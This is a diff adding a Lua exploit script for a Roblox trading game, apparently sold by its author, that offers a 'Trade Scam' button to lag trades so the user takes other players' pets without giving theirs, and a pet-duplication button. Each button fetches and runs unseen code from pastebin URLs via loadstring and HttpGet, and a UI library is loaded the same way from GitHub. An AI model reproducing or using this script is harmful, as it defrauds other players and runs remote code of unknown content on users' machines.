@@ -1,0 +1,35 @@
+--[[
+
+    Thank you for your purchase boi,
+    Contact Real trickz#9095 if you found any issue(s)! 
+    Copyright claim (c) - 2022 [Secured]
+    Made By Real trickz with ExPi Exploit Creating Library [https://docs.expi.tk]
+
+    Version: 2.0
+
+]]
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Realtrickz/ExPI/main/source.lua"))()
+local Window = Library.CreateLib("Trade Scam/Dupe", "Syanpse")
+local tradescam = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+
+-- Assets
+local TradeScamTab = Window:NewTab("Trade Scam")
+local TradeScamSection = TradeScamTab:NewSection("Trade Scam Script By Real trickz#9095")
+TradeScamSection:NewButton("Lag Trade", "It will lag the trading proccess, no one can decline and you will get their pet and they wont get yours!", function()
+    print("Thanks for using TradeScam "..game.Players.LocalPlayer)
+    loadstring(game:HttpGet("https://pastebin.com/raw/eFssjXki"))()
+end)
+
+local DupeTab = Window:NewTab("Dupe")
+local DupeSection = TradeScamTab:NewSection("Bank Dupe Script By Real trickz#9095")
+DupeSection:NewButton("Start Dupe", "It will dupe the pet(s) inside bank [Must have bank tier +2 so it can clone you with your pets!]", function()
+    print("Thanks for using Duping "..game.Players.LocalPlayer)
+    loadstring(game:HttpGet("https://pastebin.com/raw/rN3igDPc"))()
+end)
+
+local OtherTab = Window:NewTab("Others")
+local OtherSection = DupeTab:NewSection("You can find other stuffs here")
+OtherSection:NewButton("Discord", "Join our discord server!", function()
+    tradescam.Message.New("We currently have no discord!")
+end)
